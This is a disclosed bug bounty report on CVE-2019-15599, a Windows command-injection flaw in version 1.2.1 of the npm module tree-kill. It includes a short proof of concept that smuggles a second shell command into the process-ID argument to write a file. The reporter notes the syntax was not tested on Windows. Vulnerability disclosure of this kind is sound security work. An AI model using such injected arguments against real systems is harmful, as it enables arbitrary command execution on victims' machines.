# [H] [tree-kill] RCE via insecure command concatenation (only Windows)

## Summary
Severity: High (CVSS 7.0)
Program: Node.js third-party modules
Weakness: Code Injection
Reporter: mik317
State: resolved
Disclosed: 2019-12-04T19:54:11.050Z
CVE: CVE-2019-15599
Source: https://hackerone.com/reports/701183

## Details
I would like to report a `RCE` issue in the `tree-kill` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `tree-kill`
**version:** `1.2.1`
**npm page:** `https://www.npmjs.com/package/tree-kill`

## Module Description
> Kill all processes in the process tree, including the root process.

## Module Stats
[N/A] downloads in the last day
[2,108,440] downloads in the last week
[~10M] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is concatenated with a `command` that will be executed without any check. The issue arises here: https://github.com/pkrumins/node-tree-kill/blob/master/index.js#L20 (as you can see, the `Linux` part is sanitized, while the `Win` one no ... it simply uses the `+` operand to concatenate the input)

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var kill = require('tree-kill');
kill('3333332 & echo "HACKED" > HACKED.txt & ');
```
1. Execute the following commands in another terminal:

```bash
npm i tree-kill # Install affected module
dir # Check *HACKED.txt* doesn't exist
node poc.js #  Run the PoC
dir # Now *HACKED.txt* exists :)
```
1. A new file called `HACKED.txt` will be created, containing the `HACKED` string
Note I can't provide a screenshot as I'm working on `Linux` (I'll be able to reinstall win only the next week), but the code showed in the module (line 20) makes clear the attack is possible. Pls note I'm not sure of the `batch syntax used` , as said I can't verify it on a `win` machine. Before close the report, share with me eventual problems, in order to make me able to determine if the provided PoC is fully working or lacks in something :)


_Trimmed to 38 lines — full report: https://hackerone.com/reports/701183_
